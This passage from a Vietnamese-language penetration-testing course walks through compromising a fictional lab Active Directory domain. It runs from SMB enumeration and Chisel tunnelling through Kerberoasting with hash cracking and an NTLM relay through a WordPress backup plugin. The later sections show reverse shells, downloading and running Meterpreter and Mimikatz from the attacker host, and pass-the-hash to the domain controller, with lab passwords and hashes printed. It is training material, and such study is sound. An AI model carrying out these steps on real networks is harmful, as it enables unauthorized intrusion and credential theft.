SMB         172.16.6.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.6.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.240    445    DCSRV1           [+] Enumerated shares
SMB         172.16.6.240    445    DCSRV1           Share           Permissions     Remark
SMB         172.16.6.240    445    DCSRV1           -----           -----------     ------
SMB         172.16.6.240    445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.6.240    445    DCSRV1           C$                              Default share
SMB         172.16.6.240    445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.6.240    445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.6.240    445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.6.241    445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.6.241    445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.6.241    445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.6.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.6.241    445    INTERNALSRV1     C$                              Default share
SMB         172.16.6.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.6.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.254    445    MAILSRV1         [+] Enumerated shares
SMB         172.16.6.254    445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.6.254    445    MAILSRV1         -----           -----------     ------
SMB         172.16.6.254    445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.6.254    445    MAILSRV1         C$                              Default share
SMB         172.16.6.254    445    MAILSRV1         IPC$            READ            Remote IPC
```

                                      *Listing 63 - Liệt kê SMB bằng CrackMapExec và proxychains*

Listing 63 cho thấy john không có các quyền có thể khai thác hoặc thú vị trên bất kỳ share nào đã phát hiện. Như chúng ta đã xác lập thông qua truy vấn BloodHound dựng sẵn và bây giờ qua việc quét, john là một domain user bình thường không có đặc quyền local Administrator trên bất kỳ máy nào trong domain.

CrackMapExec phiên bản 5.4.0 có thể ném lỗi The NETBIOS connection with the remote host is timed out đối với DCSRV1, hoặc không cung cấp output nào cả. Phiên bản 5.4.1 có chứa bản sửa lỗi để giải quyết vấn đề này.

Output cũng cho biết MAILSRV1 và INTERNALSRV1 có SMB signing được đặt là False. Khi cơ chế bảo mật này không được bật, chúng ta có thể thực hiện các cuộc tấn công relay nếu có thể ép một yêu cầu xác thực.

Tiếp theo, hãy dùng Nmap để quét các cổng thường được sử dụng bởi web application và FTP server nhắm tới MAILSRV1, DCSRV1 và INTERNALSRV1. Chúng ta phải chỉ định -sT để thực hiện TCP connect scan. Nếu không, Nmap sẽ không hoạt động qua Proxychains.

```
kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 07:17 EDT
Nmap scan report for 172.16.6.240
Host is up (2.2s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for internalsrv1.beyond.com (172.16.6.241)
Host is up (0.21s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.6.254
Host is up (0.20s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https

Nmap done: 3 IP addresses (3 hosts up) scanned in 14.34 seconds
```

                                       *Listing 64 - Dùng Nmap để quét cổng 21, 80 và 443*

Listing 64 cho thấy Nmap đã phát hiện các cổng mở 80 và 443 trên 172.16.6.241 (INTERNALSRV1) và cổng 80 trên 172.16.6.254 (MAILSRV1). Hiện tại, chúng ta có thể bỏ qua cái sau vì nhiều khả năng nó là cùng trang web và dịch vụ mà chúng ta đã liệt kê từ góc nhìn bên ngoài.

Mặc dù chúng ta có thể sử dụng SOCKS5 proxy và proxychains để duyệt tới cổng mở trên 172.16.6.241, chúng ta sẽ sử dụng Chisel vì nó cung cấp một phiên trình duyệt ổn định và tương tác hơn. Từ trang releases, chúng ta tải về các phiên bản Windows và Linux amd64 và giải nén các binary vào /home/kali/beyond/.

Trên máy Kali, chúng ta sẽ chạy Chisel ở chế độ server để nhận các kết nối đến trên cổng 8080. Ngoài ra, chúng ta sẽ thêm tùy chọn --reverse để cho phép reverse port forwarding.

```
kali@kali:~/beyond$ chmod a+x chisel

kali@kali:~/beyond$ ./chisel server -p 8080 --reverse
2022/10/11 07:20:46 server: Reverse tunnelling enabled
2022/10/11 07:20:46 server: Fingerprint UR6ly2hYyr8iefMfm+gK5mG1R06nTKJF0HV+2bAws6E=
2022/10/11 07:20:46 server: Listening on http://0.0.0.0:8080
```

     *Listing 65 - Thiết lập Chisel trên Kali để truy cập Web Server trên INTERNALSRV1 qua Browser*

Sau đó, chúng ta sẽ chuyển binary chisel.exe đã giải nén sang CLIENTWK1 bằng lệnh upload của Meterpreter.

```
msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
[*] Uploading  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Uploaded 7.85 MiB of 7.85 MiB (100.0%): /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Completed  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
```

                  *Listing 66 - Upload Chisel lên CLIENTWK1 thông qua Meterpreter session*

Bây giờ, chúng ta có thể nhập shell và dùng Chisel ở chế độ client để kết nối ngược về máy Kali trên cổng 8080. Chúng ta sẽ tạo reverse port forward với cú pháp R:localport:remotehost:remoteport. Trong trường hợp này, remote host và port là 172.16.6.241 và 80. Local port chúng ta muốn dùng là 80.

```
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
```

      *Listing 67 - Dùng Chisel để thiết lập reverse port forwarding tới cổng 80 trên INTERNALSRV1*

Khi Chisel kết nối, chúng ta có thể duyệt tới cổng 80 trên 172.16.6.241 thông qua cổng 80 trên máy Kali (127.0.0.1) bằng Firefox:

![image.png](image%2015.png)

                                 *Hình 16: Trang WordPress trên INTERNALSRV1 (172.16.6.241)*

Hình 16 cho chúng ta thấy một WordPress instance (được chỉ ra bởi URL và tiêu đề trang) trên INTERNALSRV1. Hãy duyệt tới trang đăng nhập dashboard WordPress tại [http://127.0.0.1/wordpress/wp-admin](http://127.0.0.1/wordpress/wp-admin) và thử đăng nhập bằng các credential chúng ta đã phát hiện cho đến thời điểm này.

Sau khi nhập URL, Firefox hiển thị một lỗi:

![image.png](image%2016.png)

                                    *Hình 17: Redirect thất bại tới trang đăng nhập Administrator*

Thanh điều hướng trong Firefox cho thấy chúng ta đã bị redirect tới internalsrv1.beyond.com. Chúng ta có thể giả định rằng WordPress instance đã đặt DNS name là địa chỉ này thay vì địa chỉ IP. Vì máy của chúng ta không có thông tin về DNS name này, chúng ta không thể kết nối tới trang.

Để có thể sử dụng đầy đủ web application, chúng ta sẽ thêm internalsrv1.beyond.com trỏ về 127.0.0.1 vào /etc/hosts.

```
kali@kali:~/beyond$ cat /etc/hosts                         
127.0.0.1       localhost
127.0.1.1       kali
...
127.0.0.1    internalsrv1.beyond.com
...
```

                                                      *Listing 68 - Nội dung của /etc/hosts*

Bây giờ, hãy mở lại trang /wp-admin.

![image.png](image%2017.png)

                       *Hình 18: Trang đăng nhập Administrator của WordPress trên INTERNALSRV1*

Hình 18 cho thấy trang đăng nhập hiện đã hiển thị đúng.

Hãy thử đăng nhập bằng các credential chúng ta đã thu được cho đến thời điểm này cũng như các cặp username và password phổ biến, như admin:admin. Đáng tiếc là không cái nào hoạt động.

Hãy tóm tắt thông tin chúng ta đã thu thập trong phần này trước khi thực hiện tấn công. Trước tiên, chúng ta đã liệt kê tất cả các phiên đang hoạt động. Điều thú vị là domain administrator beccy có một phiên đang hoạt động trên MAILSRV1. Tiếp theo, chúng ta đã xác định daniela là một user kerberoastable do SPN http/internalsrv1.beyond.com.

Sau đó, chúng ta thiết lập một SOCKS5 proxy với Metasploit và dùng CrackMapExec cùng Nmap để liệt kê mạng. Output cho thấy MAILSRV1 và INTERNALSRV1 mỗi máy đều có một web server có thể truy cập và SMB signing bị tắt. Thông qua Chisel, chúng ta có thể duyệt tới WordPress instance trên INTERNALSRV1. Tuy nhiên, không credential nào hoạt động để đăng nhập vào trang đăng nhập WordPress.

---

# 5. Tấn Công Một Ứng Dụng Web Nội Bộ

---

Learning Unit này bao gồm các Learning Objective sau:

- Thực hiện Kerberoasting
- Lạm dụng một chức năng của WordPress Plugin để thực hiện một cuộc tấn công Relay

Trong Learning Unit trước, chúng ta đã thu thập được một lượng lớn thông tin và dữ liệu liên quan đến mạng domain của khách hàng. Trong Learning Unit này, chúng ta sẽ kết hợp nhiều mảnh thông tin đã thu thập để tạo ra một vector tấn công.

---

## **5.1. Speak Kerberoast and Enter**

---

Dựa trên thông tin từ Learning Unit trước, ứng dụng web trên **INTERNALSRV1** là mục tiêu hứa hẹn nhất ở thời điểm hiện tại. Vì đây là một trang WordPress, chúng ta có thể sử dụng lại **WPScan** hoặc thực hiện các cuộc tấn công mật khẩu để đăng nhập thành công vào dashboard của WordPress.

Mỗi khi có thêm thông tin mới, chúng ta cần đánh giá lại những gì mình đã biết. Trong trường hợp này, điều đó có nghĩa là chúng ta đã biết **daniela** có một **SPN http** được ánh xạ tới **INTERNALSRV1**. Giả định của chúng ta lúc này là **daniela** có thể đăng nhập thành công vào trang đăng nhập WordPress.

Vì **daniela** là một tài khoản **kerberoastable**, chúng ta có thể thử lấy mật khẩu của người dùng theo cách này. Nếu chúng ta crack được **TGS-REP hash**, chúng ta có thể đăng nhập vào WordPress và giành thêm quyền truy cập vào **INTERNALSRV1**.

Nếu vector tấn công này thất bại, chúng ta có thể sử dụng **WPScan** và các công cụ liệt kê ứng dụng web khác để xác định các lỗ hổng tiềm năng trên **INTERNALSRV1** hoặc chuyển mục tiêu sang **MAILSRV1**.

Hãy thực hiện **Kerberoasting** trên Kali với **impacket-GetUserSPNs** thông qua **SOCKS5 proxy** bằng **Proxychains**. Để lấy **TGS-REP hash** cho **daniela**, chúng ta phải cung cấp thông tin xác thực của một domain user. Vì chúng ta chỉ có một bộ thông tin hợp lệ, chúng ta sẽ dùng **john**.

```
kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
```

                                  *Listing 69 - Kerberoasting tài khoản người dùng daniela*

Hãy lưu hash vào `/home/kali/beyond/daniela.hash` và chạy **Hashcat** để crack.

```
kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
```

                                                    *Listing 70 - Cracking TGS-REP hash*

Rất tốt! Chúng ta đã crack thành công **TGS-REP hash** và thu được mật khẩu dạng plaintext của **daniela**. Hãy lưu username và password vào **creds.txt**.

Chúng ta đã xác định rằng không có domain user nào có quyền **Local Administrator** trên bất kỳ domain computer nào và chúng ta cũng không thể sử dụng **RDP** để đăng nhập vào chúng. Tuy nhiên, chúng ta có thể sử dụng các giao thức như **WinRM** để truy cập các hệ thống khác.

Tiếp theo, hãy thử đăng nhập vào WordPress tại `/wp-admin` thông qua cổng đã được forward.

![image.png](image%2018.png)

*Figure 19: Đăng nhập thành công vào WordPress với tài khoản daniela*

Tuyệt vời! Chúng ta đã đăng nhập thành công vào WordPress với tư cách **daniela**. Trong phần tiếp theo, chúng ta sẽ tận dụng quyền truy cập này để giành quyền truy cập vào một hệ thống khác.

---

## 5.2. Lạm Dụng Một WordPress Plugin để Thực Hiện Relay Attack

---

Trong phần trước, chúng ta đã thu được mật khẩu plaintext của **daniela** và giành được quyền truy cập vào **WordPress dashboard** trên **INTERNALSRV1**. Bây giờ, hãy xem lại một số cài đặt và plugin.

Trước tiên, chúng ta bắt đầu với danh sách người dùng đã được cấu hình:

![image.png](image%2019.png)

                                             *Figure 20: Daniela là người dùng WordPress duy nhất*

Figure 20 cho thấy **daniela** là người dùng duy nhất. Tiếp theo, hãy kiểm tra **Settings > General**.

![image.png](image%2020.png)

                                                            *Figure 21: Cài đặt WordPress chung*

WordPress Address (URL) và Site Address (URL) là các DNS name đúng như chúng ta đã giả định. Các cài đặt khác trong mục Settings hầu hết đều là giá trị mặc định. Bây giờ, hãy xem các plugin đã được cài đặt.

![image.png](image%2021.png)

*Figure 22: Các plugin WordPress đã cài đặt*

Figure 22 cho thấy có ba plugin, nhưng chỉ có **Backup Migration** là đang được bật. Hãy nhấp vào **Manage**, thao tác này sẽ đưa chúng ta đến trang cấu hình plugin. Khi duyệt qua các menu và cài đặt, chúng ta phát hiện **Backup directory path**.

![image.png](image%2022.png)

                                                  *Figure 23: Cài đặt plugin Backup Migration*

Figure 23 cho thấy chúng ta có thể nhập một đường dẫn vào trường này, đường dẫn này sẽ được sử dụng để lưu trữ bản sao lưu. Chúng ta có thể lạm dụng chức năng này để buộc hệ thống nền thực hiện một quá trình xác thực.

Hãy tạm dừng ở đây một chút và lập kế hoạch cho các bước tiếp theo. Tại thời điểm này, có hai vector tấn công đầy hứa hẹn.

Vector thứ nhất là tải lên một **plugin WordPress độc hại** lên **INTERNALSRV1**. Bằng cách chuẩn bị và tải lên một web shell hoặc reverse shell, chúng ta có thể giành được **code execution** trên hệ thống nền.

Đối với vector tấn công thứ hai, chúng ta cần xem lại kết quả **BloodHound** và đưa ra một số giả định. Như chúng ta đã phát hiện, **tài khoản Administrator cục bộ** có một **active session** trên **INTERNALSRV1**. Dựa trên session này, chúng ta có thể giả định rằng tài khoản này được sử dụng để chạy WordPress instance.

Ngoài ra, không hiếm trường hợp các tài khoản **local Administrator** trên nhiều máy trong một domain được cấu hình với **cùng một mật khẩu**. Hãy giả định điều này đúng với môi trường mục tiêu.

Chúng ta cũng biết rằng **domain administrator beccy** có một active session trên **MAILSRV1**, do đó thông tin xác thực của người dùng này có thể được cache trên hệ thống.

Do **SMB signing** bị vô hiệu hóa trên **MAILSRV1** và **INTERNALSRV1**, một **relay attack** là khả thi nếu chúng ta có thể buộc một yêu cầu xác thực.

Cuối cùng, chúng ta đã xác định trường **Backup directory path** trong plugin **Backup Migration** của WordPress, chứa đường dẫn đích cho bản sao lưu. Điều này có thể cho phép chúng ta buộc một yêu cầu xác thực như vậy.

Dựa trên tất cả những thông tin này, hãy xác định kế hoạch cho vector tấn công thứ hai. Trước tiên, chúng ta sẽ cố gắng buộc một yêu cầu xác thực bằng cách lạm dụng **Backup directory path** của plugin **Backup Migration** trên **INTERNALSRV1**. Bằng cách đặt đường dẫn đích trỏ tới máy Kali của chúng ta, chúng ta có thể sử dụng **impacket-ntlmrelayx** để relay kết nối đến **MAILSRV1**. Nếu các giả định của chúng ta là đúng, yêu cầu xác thực sẽ được thực hiện trong ngữ cảnh của **local Administrator** trên **INTERNALSRV1**, tài khoản này có cùng mật khẩu với **local Administrator** trên **MAILSRV1**.

Nếu cuộc tấn công này thành công, chúng ta sẽ giành được **code execution với đặc quyền cao** trên **MAILSRV1**, từ đó có thể trích xuất **NTLM hash** của **beccy** và do đó đạt được một trong những mục tiêu chính của bài penetration test.

Vì vector tấn công thứ hai không chỉ dẫn đến code execution trên một hệ thống duy nhất mà còn cung cấp một con đường tiềm năng để đạt được mục tiêu của bài kiểm thử, chúng ta sẽ thực hiện **relay attack** trước.

Hãy thiết lập **impacket-ntlmrelayx** trước khi chỉnh sửa **Backup directory path** trong plugin WordPress. Chúng ta sẽ sử dụng **--no-http-server** và **-smb2support** để vô hiệu hóa HTTP server và bật hỗ trợ SMB2. Chúng ta sẽ chỉ định địa chỉ bên ngoài của **MAILSRV1**, **192.168.50.242**, làm mục tiêu cho relay attack. Bằng cách sử dụng địa chỉ bên ngoài, chúng ta không cần phải proxy relay attack qua Proxychains. Cuối cùng, chúng ta sẽ **base64-encode** một PowerShell reverse shell oneliner kết nối ngược về máy Kali của chúng ta trên port **9999** và cung cấp nó làm lệnh cho tham số **-c**.

```
kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

                                                   *Listing 71 - Thiết lập impacket-ntlmrelayx*

Tiếp theo, chúng ta sẽ thiết lập một **Netcat listener** trên port **9999** để nhận reverse shell.

```
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
```

                                          *Listing 72 - Thiết lập Netcat listener trên port 9999*

Bây giờ, khi mọi thứ đã sẵn sàng, chúng ta có thể chỉnh sửa **Backup directory path**.

Hãy đặt đường dẫn thành **URI reference** `//192.168.119.5/test`, trong đó IP là địa chỉ máy Kali của chúng ta và **test** là một đường dẫn không tồn tại.

![image.png](image%2023.png)

                                       *Figure 24: Backup directory path đã được chỉnh sửa*

Sau khi nhập xong, chúng ta cuộn xuống và nhấp vào **Save**. Thao tác này sẽ khiến plugin WordPress thực hiện xác thực tới **impacket-ntlmrelayx** trong ngữ cảnh của người dùng đang chạy WordPress.

```
...
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.50.242
...
[*] Stopping service RemoteRegistry
```

           *Listing 73 - Thực thi reverse shell trên MAILSRV1 thông qua impacket-ntlmrelayx*

Listing 73 xác nhận các giả định mà chúng ta đã đưa ra trước đó. Thứ nhất, **INTERNALSRV1/ADMINISTRATOR** đã được sử dụng để thực hiện xác thực. Thứ hai, bằng việc xác thực thành công tới **MAILSRV1**, chúng ta xác nhận rằng cả hai máy đều sử dụng **cùng một mật khẩu cho tài khoản local Administrator**.

Output cũng cho thấy lệnh được relay trên **MAILSRV1** đã được thực thi. Hãy kiểm tra Netcat listener để xem reverse shell đến.

```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system

PS C:\Windows\system32> hostname
MAILSRV1

PS C:\Windows\system32> 
```

                                                         *Listing 74 - Reverse shell nhận được*

Tuyệt vời! Chúng ta đã giành được **code execution** với quyền **NT AUTHORITY\SYSTEM** bằng cách relay một yêu cầu xác thực từ plugin WordPress trên **INTERNALSRV1** để xác thực với tư cách local Administrator trên **MAILSRV1**.

Trong Learning Unit tiếp theo, chúng ta sẽ tận dụng interactive shell trên **MAILSRV1** để giành quyền truy cập đặc quyền vào domain và **domain controller**.

---

# 6. Giành Quyền Truy Cập Domain Controller

---

Learning Unit này bao gồm các **Learning Objectives** sau:

- Thu thập thông tin để chuẩn bị cho các client-side attacks
- Khai thác client fingerprinting để thu thập thông tin

Trong Learning Unit trước, chúng ta đã giành được quyền truy cập vào **MAILSRV1** với đặc quyền **NT AUTHORITY\SYSTEM**. Dựa trên những thông tin đã thu thập được trong quá trình liệt kê mạng, trong Learning Unit này chúng ta sẽ cố gắng đạt được **domain Administrator privileges** và sử dụng chúng để truy cập **domain controller**.

---

## 6.1. Thông Tin Xác Thực Được Cache

---

Đúng như kế hoạch, chúng ta đã giành được quyền **code execution với đặc quyền cao** trên **MAILSRV1**. Bước tiếp theo là trích xuất **password hash** của người dùng **beccy**, tài khoản hiện đang có **active session** trên hệ thống này.

Tùy thuộc vào mục tiêu của bài kiểm thử xâm nhập, chúng ta **không nên bỏ qua bước local enumeration** trên hệ thống **MAILSRV1**. Việc này có thể giúp phát hiện thêm các lỗ hổng và thông tin nhạy cảm khác, những thứ có thể bị bỏ sót nếu chúng ta trực tiếp đi trích xuất NTLM hash của **beccy**.

Sau khi xác định rằng **không có AV** nào đang chạy, chúng ta nên **nâng cấp shell lên Meterpreter**. Điều này không chỉ cung cấp một môi trường shell ổn định và mạnh mẽ hơn, mà còn hỗ trợ rất tốt cho giai đoạn **post-exploitation**.

Hãy tải payload **Meterpreter reverse shell** đã được tạo trước đó là **met.exe** để phục vụ cho post-exploitation.

```
PS C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\Administrator> .\met.exe
```

                                 *Listing 75 - Tải xuống và thực thi Meterpreter reverse shell*

Trong **Metasploit**, chúng ta sẽ nhận được một session mới.

```
[*] Sending stage (200774 bytes) to 192.168.50.242
[*] Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)
```

*Listing 76 - Meterpreter session mới trong Metasploit*

Tiếp theo, hãy tương tác với session này và spawn một PowerShell command shell mới.

```
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> 
```

                               *Listing 77 - Tương tác với Session 2 và khởi tạo PowerShell shell*

Tiếp theo, chúng ta sẽ tải **phiên bản Mimikatz mới nhất** về Kali và phục vụ nó thông qua **Python3 web server** trên cổng **8000**. Trên **MAILSRV1**, chúng ta sẽ tải Mimikatz bằng **iwr** và thực thi nó.

```
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe

PS C:\Users\Administrator> .\mimikatz.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
```

                        *Listing 78 - Tải xuống và khởi chạy phiên bản Mimikatz mới nhất từ Kali*

Sau khi Mimikatz được khởi chạy, chúng ta sử dụng **privilege::debug** để lấy **SeDebugPrivilege**. Sau đó, dùng **sekurlsa::logonpasswords** để liệt kê tất cả thông tin xác thực của các provider có trên hệ thống.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/8/2023 4:50:32 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
...
```

                            *Listing 79 - Trích xuất thông tin xác thực của beccy bằng Mimikatz*

Tuyệt vời! Chúng ta đã **trích xuất thành công mật khẩu dạng clear text và NTLM hash** của **domain administrator beccy**. Hãy lưu **username, mật khẩu và NTLM hash** này vào **creds.txt** trên hệ thống Kali.

Với bộ thông tin xác thực này, chúng ta đã sẵn sàng thực hiện **bước cuối cùng của bài kiểm thử xâm nhập**: truy cập **domain controller**. Chúng ta sẽ thực hiện điều này trong phần tiếp theo.

---

## 6.2. Di Chuyển Ngang

---

Trong phần này, chúng ta sẽ tận dụng **domain admin privileges** của **beccy** để truy cập **domain controller**, qua đó hoàn thành mục tiêu thứ hai của bài kiểm thử xâm nhập.

Vì chúng ta đã thu được **mật khẩu dạng clear text** và **NTLM hash** của **beccy**, chúng ta có thể sử dụng **impacket-psexec** để có được một **interactive shell** trên **DCSRV1**. Mặc dù có thể sử dụng một trong hai loại thông tin xác thực, chúng ta sẽ dùng **NTLM hash**. Khi đã có command line shell, chúng ta sẽ xác nhận rằng mình có **quyền truy cập đặc quyền** trên **DCSRV1 (172.16.6.240)**.

```
kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.6.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.6.240.....
[*] Creating service tahE on 172.16.6.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
```

                                *Listing 80 - Sử dụng psexec để giành được interactive shell*

Tốt lắm! **Listing 80** cho thấy chúng ta đã **hoàn thành toàn bộ mục tiêu của bài kiểm thử xâm nhập**: đạt được **domain administrator privileges** và **truy cập thành công domain controller**.

---

# 7. Tổng kết

---

Trong Module này, chúng ta đã thực hiện một bài kiểm thử xâm nhập cho khách hàng giả định **BEYOND Finances**. Các mục tiêu mà khách hàng đặt ra là giành quyền truy cập vào **mạng nội bộ**, đạt được **domain Administrator privileges**, và **truy cập domain controller**.

Sau khi có được **initial foothold** trong mạng nội bộ, chúng ta thực hiện **Kerberoasting** để thu được thông tin xác thực của một **domain user**. Với tài khoản này, chúng ta có thể đăng nhập vào một **WordPress instance** và lạm dụng một **plugin** để thực hiện xác thực tới máy Kali của chúng ta. Sau đó, chúng ta **relay** yêu cầu xác thực này sang một máy khác và giành được **code execution** với quyền **NT AUTHORITY\SYSTEM**. Với các **administrative privileges**, chúng ta trích xuất thông tin xác thực của một **domain Admin account**. Cuối cùng, chúng ta truy cập thành công **domain controller**.

Chúng ta không thể nhấn mạnh đủ tầm quan trọng của việc **ghi chú chi tiết** trong suốt một bài kiểm thử xâm nhập thực tế và duy trì một **log đầy đủ** về thời điểm các hành động được thực hiện. Sau khi kết thúc một bài kiểm thử xâm nhập, chúng ta phải đảm bảo rằng mọi thứ được **khôi phục về trạng thái ban đầu**. Bất kỳ exploit hay artifact nào cũng phải được **xóa bỏ** hoặc ít nhất là **thông báo cho khách hàng** về vị trí của chúng.

